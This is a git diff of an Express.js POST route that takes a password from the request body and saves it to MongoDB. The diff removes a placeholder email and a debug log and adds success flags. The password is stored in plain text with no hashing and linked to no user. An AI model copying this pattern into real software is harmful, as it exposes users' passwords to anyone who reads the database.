@@ -42,19 +42,19 @@ app.get("/", (req, res) => {
 // ✅ POST Route to Store Password in MongoDB
 app.post("/", async (req, res) => {
     try {
-        console.log("Incoming Data:", req.body);  // <-- Log received JSON data
         const { password } = req.body;
+
         if (!password) {
-            return res.status(400).json({ message: "❌ Password is required!" });
+            return res.status(400).json({ success: false, message: "Password is required!" });
         }
 
-        const newUser = new User({ email: "unknown", password }); // Store password with a placeholder email
+        const newUser = new User({ password }); // Saving only the password
         await newUser.save();
-
-        res.json({ message: "✅ Password stored successfully!" });
+        
+        res.json({ success: true, message: "Password stored successfully!" });
     } catch (err) {
-        console.error("❌ Error storing password:", err);
-        res.status(500).json({ message: "❌ Server error!" });
+        console.error("Error storing password:", err);
+        res.status(500).json({ success: false, message: "Server error!" });
     }
 });
 
